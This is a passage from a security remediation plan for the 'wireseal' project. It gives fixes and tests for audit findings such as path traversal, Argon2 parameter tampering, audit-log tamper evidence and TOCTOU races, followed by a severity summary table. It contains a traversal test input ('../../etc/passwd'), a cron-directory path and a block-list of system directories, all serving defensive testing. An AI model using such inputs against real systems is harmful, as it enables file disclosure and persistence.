- After parsing the header, validate `memory_cost <= ARGON2_MEMORY_COST_KIB * 4` (max 1 GiB), `time_cost <= 50`, `parallelism <= 16`. Raise `VaultTamperedError` for out-of-range values before calling `_derive_master_key`.
- Tests: tampered vault with huge memory_cost → VaultTamperedError without OOM.

**SEC-022: static file serving path traversal**
- File: `src/wireseal/api.py`
- Call `file_path.resolve()` and confirm the resolved path starts with `dist.resolve()`. If not, return 404.
- Tests: request for `../../etc/passwd` → 404.

**SEC-025: audit log without tamper evidence**
- File: `src/wireseal/security/audit.py`
- Append a running SHA-256 chain hash to each entry: `chain_hash = sha256(prev_hash + json_line)`. Store the previous hash in the file (special header line or first field of each entry). On read, verify the chain. This does not prevent truncation but makes insertion detectable.
- Alternatively, HMAC each entry with a key derived from the vault master key.
- Tests: tampered log line → chain verification fails.

**SEC-027: backup local_path unrestricted**
- File: `src/wireseal/backup/manager.py`
- Validate `local_path` is not within `/etc`, `/bin`, `/sbin`, `/usr`, `/lib`, `/boot`, or other sensitive directories. Use a block-list of sensitive path prefixes.
- Tests: local_path = `/etc/cron.hourly/` → ValueError.

---

### Phase 5 — Hardening and monitoring — Ongoing

**Closes:** SEC-016, SEC-023

- **SEC-016 (TOCTOU in init):** Wrap the `_VAULT_PATH.exists()` check and `Vault.create()` call in a single file lock.
- **SEC-023 (pin fail count TOCTOU):** Merge the check-then-increment into a single lock acquisition: read the count, check it, increment it, and decide to wipe, all within one `with _lock:` block.
- Add integration tests for all TOCTOU race conditions using `concurrent.futures.ThreadPoolExecutor`.
- Enable Python `ResourceWarning` in test runs to catch file descriptor leaks.
- Pin GitHub Actions runners by SHA in `.github/workflows/release.yml`.
- Add `bandit` to CI pipeline: `bandit -r src/ -ll` (high and medium severity).

---

## Summary Table

| ID | Title | Severity | Phase |
|----|-------|----------|-------|
| SEC-001 | Audit log unauthenticated | HIGH | 2 |
| SEC-002 | fresh-start no auth | CRITICAL | 1 |
| SEC-003 | CORS/CSRF enforcement | HIGH | 2 |
| SEC-004 | Unbounded body read DoS | HIGH | 2 |
| SEC-005 | Auto-update no sig verification | CRITICAL | 1 |
| SEC-006 | Admin auth empty password | HIGH | 2 |
| SEC-007 | admin/exec no allowlist | CRITICAL | 1 |
| SEC-008 | admin/file no path restriction | CRITICAL | 1 |
| SEC-009 | Backup restore path traversal | HIGH | 4 |
| SEC-010 | tarfile extractall path traversal | HIGH | 1 |
| SEC-011 | wipe_string ineffective | MEDIUM | 3 |
| SEC-012 | bytes(secret) unwipeable | MEDIUM | 3 |
| SEC-013 | admin_id defaults to owner | MEDIUM | 3 |
| SEC-014 | PIN counter not per-IP | MEDIUM | 4 |
| SEC-015 | Heartbeat no auth | MEDIUM | 4 |
| SEC-016 | Init TOCTOU race | LOW | 5 |
| SEC-017 | webdav_pass plaintext in cache | MEDIUM | 3 |
| SEC-018 | update/install no auth | HIGH | 1 |
| SEC-019 | Argon2 params trusted from header | MEDIUM | 4 |
| SEC-020 | client/config exposes private key | MEDIUM | 3 |
| SEC-021 | SSH password plaintext in ticket | MEDIUM | 3 |
| SEC-022 | Static file path traversal | MEDIUM | 4 |
| SEC-023 | PIN fail count TOCTOU | MEDIUM | 5 |
| SEC-024 | remove-pin no auth | LOW | 2 |
| SEC-025 | Audit log no tamper evidence | MEDIUM | 4 |
| SEC-026 | update-check no auth | LOW | 2 |
| SEC-027 | Backup path unrestricted | MEDIUM | 4 |
